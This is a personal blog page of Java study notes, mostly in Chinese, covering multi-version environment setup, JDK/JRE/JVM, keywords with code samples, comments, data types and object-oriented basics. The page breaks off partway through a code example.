<!DOCTYPE HTML>
<html lang="en">




<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Java, Hunter|Hacker|Coder|Artist">
    <meta name="description" content="信念与认知">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', '');
</script>


    <title>Java | Jf71o0x1o1l</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jf71o0x1o1l" type="application/atom+xml">
</head>


    

                <body>
                    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Jf71o0x1o1l</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>Contact</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Jf71o0x1o1l</div>
        <div class="logo-desc">
            
            信念与认知
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			Contact
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

                        



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Java</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Java/">
                                <span class="chip bg-color">Java</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Programming/" class="post-category">
                                Programming
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2023-12-09
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2023-12-07
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    17.4k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h3
id="setting-environment-variables-for-java-multi-version-environment">Setting
Environment Variables for Java Multi-Version Environment</h3>
<ol type="1">
<li>two version<img
src="https://s2.loli.net/2023/08/26/FtRSexfOpZHio53.png"
alt="image-20230826155042290" /></li>
<li><code>CLASSPATH</code><img
src="https://s2.loli.net/2023/08/26/9Su6UwA4mcgKOM2.png"
alt="image-20230826153319397" /></li>
<li>PATH<img src="https://s2.loli.net/2023/08/26/Q16tqrRjsydmK7M.png"
alt="image-20230826153749469" /></li>
<li><strong>!important</strong>: this variable,Remove these three files
by changing the extension<img
src="https://s2.loli.net/2023/08/26/slGfmzx4guXJocU.png"
alt="image-20230826155253241" /></li>
<li>result<img
src="C:/Users/22514/AppData/Roaming/Typora/typora-user-images/image-20230826155619662.png"
alt="image-20230826155619662" /></li>
</ol>
<h3 id="哪些java知识不需要再学了">哪些Java知识不需要再学了</h3>
<ol type="1">
<li>AWT 和 Swing</li>
<li>Applet</li>
<li>XML</li>
<li>JDBC：我个人不建议再学习偏<code>底层</code>的 JDBC
了，尤其是对于时间宝贵的自学程序员来说。与其花这点时间，不如把精力投入到
<code>MyBatis</code>
的学习上。当然了，如果真的有时间，真的想打基础，研究一下也无可厚非</li>
<li>Struts</li>
<li>Hibernate：取而代之的是轻量级的 MyBatis</li>
<li>JSP：</li>
<li>servlet: JavaWeb 容器的基石，</li>
</ol>
<h3 id="java概述">Java概述</h3>
<ol type="1">
<li><p>JVM、JRE、JDK 有什么关系:</p>
<p><code>JDK（Java Development Kit）</code>是用于开发 Java
应用程序的软件环境。里面包含运行时环境（JRE）和其他 Java
开发所需的工具，比如说解释器（java）、编译器（javac）、文档生成器（javadoc）等等。</p>
<p><code>JRE（Java Runtime Environment）</code>是用于运行 Java
应用程序的软件环境。也就是说，如果只想运行 Java 程序而不需要开发 Java
程序的话，只需要安装 JRE 就可以了。</p>
<p><code>JVM (Java Virtual Machine)</code> ，也就是 Java
虚拟机，由一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域等组成，屏蔽了不同操作系统（macOS、Windows、Linux）的差异性，使得
Java 能够“一次编译，到处运行</p></li>
</ol>
<h3 id="第一个程序">第一个程序</h3>
<ol type="1">
<li>字节码由 JVM 逐条解释执行。</li>
<li>部分字节码可能由 <a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/jvm/jit.html">JIT（即时编译，戳链接了解open
in new window</a>）编译为机器指令直接执行。</li>
<li>Java 是解释和编译并存。</li>
</ol>
<h3 id="java关键字">Java关键字</h3>
<ol type="1">
<li><p><code>extends</code></p></li>
<li><p><code>enum</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PlayerType</span> &#123;</span><br><span class="line">    TENNIS,</span><br><span class="line">    FOOTBALL,</span><br><span class="line">    BASKETBALL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>final</code>:
用于表示某个变量、方法或类是最终的，不能被修改或继承</p>
<ol type="1">
<li><code>String</code> 类就是 final 的</li>
</ol></li>
<li><p><code>finally</code>: 和 try-catch
配合使用，表示无论是否处理异常，总是执行 finally 块中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span> / <span class="number">0</span>;  <span class="comment">// 抛出异常</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;发生了异常：&quot;</span> + e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;finally 块被执行&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>implements</code>： 实现接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 线程执行的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>instanceof</code>：
用于判断对象是否属于某个类型（class）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例如，假设有一个 Person 类和一个 Student 类，Student 类继承自 Person 类，可以使用 instanceof 运算符来判断一个对象是否为 Person 类或其子类的实例：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"><span class="keyword">if</span> (p <span class="keyword">instanceof</span> Person) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;p is an instance of Person&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p <span class="keyword">instanceof</span> Student) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;p is an instance of Student&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>interface</code></p></li>
<li><p><code>native</code>： 用于声明一个本地方法，本地方法是指在 Java
代码中声明但在本地代码（通常是 C 或 C++
代码）中实现的方法，它通常用于与<code>操作系统</code>或<code>其他本地库</code>进行交互。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">nativeMethod</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><code>package</code>： 用于声明类所在的包。</p></li>
<li><p><code>private</code>：
一个访问权限修饰符，表示方法或变量只对当前类可见。</p></li>
<li><p><code>protected</code>：
一个访问权限修饰符，表示方法或变量对同一包内的类和所有子类可见</p></li>
<li><p><code>super</code>： 可用于调用父类的方法或者字段。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; is eating.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name); <span class="comment">// 调用父类的构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; is barking.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.eat(); <span class="comment">// 调用父类的方法</span></span><br><span class="line">        System.out.println(name + <span class="string">&quot; is eating bones.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>synchronized</code>：
用于指定多线程代码中的同步方法、变量或者代码块</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">        count++; <span class="comment">// 同步方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123; <span class="comment">// 同步代码块</span></span><br><span class="line">            <span class="comment">// 执行一些需要同步的操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>this</code>：
可用于在方法或构造方法中引用当前对象。</p></li>
<li><p><code>throw</code>： 主动抛出异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>();</span><br></pre></td></tr></table></figure></li>
<li><p><code>throws</code>： 用于声明异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>transient</code>： 修饰的字段不会被序列化。</p></li>
<li><p><code>try</code>： 用于包裹要捕获异常的代码块。</p></li>
<li><p><code>volatile</code>：
保证不同线程对它修饰的变量进行操作时的可见性，即一个线程修改了某个变量的值，新值对其他线程来说是立即可见的。被标记为
volatile，表示这个变量是共享的，可能会被多个线程同时访</p></li>
<li><p><code>const</code> 在 C语言中是声明常量的关键字，在 Java
中可以使用 <code>public static final</code>
三个关键字的组合来达到常量的效果。</p></li>
</ol>
<h3 id="注释">注释</h3>
<ol type="1">
<li>在 Intellij IDEA 中，按下 <code>/*</code>
后敲下回车键就可以自动添加文档注释的格式，<code>*/</code>
是自动补全的</li>
<li>通过 <code>javadoc</code> 命令生成代码文档</li>
<li>文档注释中可以插入一些 <code>@</code> 注解，比如说 <code>@see</code>
引用其他类，<code>@version</code> 版本号，<code>@param</code>
参数标识符，<code>@author</code> 作者标识符，<code>@deprecated</code>
已废弃标识符，等等</li>
<li>类、字段、方法必须使用<strong>文档注释</strong>，不能使用单行注释和多行注释。因为注释文档在
IDE 编辑窗口中可以悬浮提示，提高编码效率。</li>
<li>所有的<a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/oo/abstract.html">抽象方法open in new
window</a>(包括接口中的方法)必须要用 Javadoc 注释、除了返回值、参数、
异常说明外，还必须指出该方法做什么事情，实现什么功能。</li>
<li>所有的类都必须添加创建者和创建日期</li>
</ol>
<h3 id="java数据类型">Java数据类型</h3>
<ol type="1">
<li><p>引用类型。常见的有<a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/array/array.html">数组open in new
window</a>（对，没错，数组是引用类型，后面我们会讲）、class（也就是<a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/oo/object-class.html">类open in new
window</a>），以及<a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/oo/interface.html">接口open in new
window</a>（指向的是实现接口的类的对象）。</p></li>
<li><p>当变量是<code>局部变量</code>的时候，必须得先初始化，否则编译器不允许你使用它</p></li>
<li><p>当变量是<code>成员变量</code>或者<code>静态变量</code>时，可以不进行初始化，它们会有一个默认值</p>
<table>
<thead>
<tr class="header">
<th>数据类型</th>
<th>默认值</th>
<th>大小</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>boolean</td>
<td>false</td>
<td>1 比特</td>
</tr>
<tr class="even">
<td>char</td>
<td>'000'</td>
<td>2 字节</td>
</tr>
<tr class="odd">
<td>byte</td>
<td>0</td>
<td>1 字节</td>
</tr>
<tr class="even">
<td>short</td>
<td>0</td>
<td>2 字节</td>
</tr>
<tr class="odd">
<td>int</td>
<td>0</td>
<td>4 字节</td>
</tr>
<tr class="even">
<td>long</td>
<td>0L</td>
<td>8 字节</td>
</tr>
<tr class="odd">
<td>float</td>
<td>0.0f</td>
<td>4 字节</td>
</tr>
<tr class="even">
<td>double</td>
<td>0.0</td>
<td>8 字节</td>
</tr>
</tbody>
</table></li>
<li><p>一个<code>英文字符</code>是一个字节，一个<code>中文字符</code>是两个字节</p></li>
<li><p>一个字节可以表示 2^8 = 256 个不同的值。由于 byte
是有符号的，它的值可以是<code>负数</code>或<code>正数</code>， （-128 到
127）</p></li>
<li><p>int 的取值范围在 -2,147,483,648（<code>-2 ^ 31</code>）和
2,147,483,647（<code>2 ^ 31 -1</code>）</p></li>
<li><p>long 型变量在声明的时候，末尾要带上大写的“<strong>L</strong>”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> l; <span class="comment">// 声明一个 long 类型变量</span></span><br><span class="line">l = <span class="number">100000000000L</span>; <span class="comment">// 将值 100000000000L 赋给变量 l（注意要加上 L 后缀）</span></span><br><span class="line"><span class="type">long</span> <span class="variable">m</span> <span class="operator">=</span> -<span class="number">20000000000L</span>; <span class="comment">// 声明并初始化一个 long 类型变量 m，赋值为 -20000000000L</span></span><br></pre></td></tr></table></figure></li>
<li><p>float
型变量在声明的时候，末尾要带上小写的“<strong>f</strong>”</p></li>
<li><p>字符字面量应该用单引号（''）包围，而不是双引号（""），因为<a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/string/constant-pool.html">双引号表示字符串字面量open
in new window</a>。</p></li>
<li><p>可以使用 int 的包装器类型 Integer 的 <code>toString()</code>
方法+String 的 <code>charAt()</code> 方法转成 char。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">value_int</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> <span class="variable">value_char</span> <span class="operator">=</span> Integer.toString(value_int).charAt(<span class="number">0</span>);</span><br><span class="line">System.out.println(value_char );</span><br></pre></td></tr></table></figure></li>
<li><p>包装器类型</p>
<blockquote>
<ul>
<li>Byte（对应 byte）</li>
<li>Short（对应 short）</li>
<li>Integer（对应 int）</li>
<li>Long（对应 long）</li>
<li>Float（对应 float）</li>
<li>Double（对应 double）</li>
<li>Character（对应 char）</li>
<li>Boolean（对应 boolean）</li>
</ul>
</blockquote></li>
<li><p>使用包装器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 Integer 包装器类型</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">integerValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">42</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;整数值: &quot;</span> + integerValue);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串转换为整数</span></span><br><span class="line"><span class="type">String</span> <span class="variable">numberString</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">parsedNumber</span> <span class="operator">=</span> Integer.parseInt(numberString);</span><br><span class="line">System.out.println(<span class="string">&quot;整数值: &quot;</span> + parsedNumber);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Character 包装器类型</span></span><br><span class="line"><span class="type">Character</span> <span class="variable">charValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Character</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;字符: &quot;</span> + charValue);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查字符是否为数字</span></span><br><span class="line"><span class="type">char</span> <span class="variable">testChar</span> <span class="operator">=</span> <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (Character.isDigit(testChar)) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;字符是个数字.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>对于接口类型的引用变量来说，你没法直接 new 一个：只能 new
一个实现它的类的对象</p></li>
<li><p>引用数据类型：</p>
<ul>
<li>1、变量名指向的是存储对象的内存地址，在栈上。</li>
<li>2、内存地址指向的对象存储在堆上</li>
</ul></li>
<li><p><code>栈</code>，能够和处理器（CPU，也就是脑子）直接关联，因此访问速度更快</p></li>
<li><p>这段代码会先在堆里创建一个
沉默王二的字符串对象，然后再把对象的引用 a
放到栈里面。这里面还会涉及到<a
target="_blank" rel="noopener" href="https://tobebetterjavaer.com/string/constant-pool.html">字符串常量池open
in new window</a>，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;沉默王二&quot;</span>)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li><p>example</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>picture:<img src="https://s2.loli.net/2023/09/03/D9FEJozZNGm41hV.png"
alt="basic-data-type-3d5b3e40-1abb-4624-8282-b83e58388825" /></p></li>
</ol></li>
</ol>
<h3 id="面向对象">面向对象</h3>
<ol type="1">
<li><p>面向对象是模块化的，面向对象的<code>底层</code>其实还是面向过程，只不过把面向过程进行了<code>抽象化</code>，封装成了类，方便我们的调用。</p></li>
<li><p>在类内部但在方法外部，方法内部的叫<code>临时变量</code>。</p></li>
<li><p>成员变量有时候也叫做实例变量，在<code>编译</code>时不占用内存空间，在<code>运行</code>时获取内存，也就是说，只有在对象实例化（<code>new Person()</code>）后，字段才会获取到内存，这也正是它被称作“实例”变量的原因。</p></li>
<li><p>创建对象的时候，需要一个 <code>main()</code> 方法作为入口，
<code>main()</code> 方法可以在当前类中，也可以在另外一个类中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title 